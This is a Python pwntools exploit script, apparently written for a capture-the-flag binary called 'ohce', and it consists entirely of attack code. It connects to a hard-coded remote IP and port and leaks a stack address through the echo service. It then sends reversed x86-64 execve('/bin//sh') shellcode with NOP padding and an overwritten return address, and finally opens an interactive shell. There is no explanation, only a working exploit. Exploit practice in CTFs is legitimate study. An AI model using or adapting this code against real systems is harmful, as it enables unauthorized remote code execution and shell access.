from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
sc += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

ret_offset = 0x100
sc_offset = 0x48

# p = remote("localhost", 4924)
# p = process("./ohce")
# gdb.attach(p)

p = remote("13.124.134.94", 8888)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def echo(msg):
  r("> ")
  s("1")

  s(msg)

def echo_rev(msg):
  r("> ")
  s("2")

  s(msg)

echo("A" * 0x1f)
leak_str = r("\x7f")[-6:]
stack_leak = u64(leak_str.ljust(8, '\x00'))

print '[*] stack_leak: 0x%x' % stack_leak

ret_addr = stack_leak - ret_offset
sc_addr = stack_leak - sc_offset

payload = p64(ret_addr)[:6]
payload = payload[::-1]

payload += sc[::-1]
payload = payload.ljust(0x3f, "\x90")

msg = "2" * 0x10
msg += p64(sc_addr)
msg += msg.ljust(0xff, "E")

r("> ")
s(msg)

s(payload)

p.interactive()
p.close()
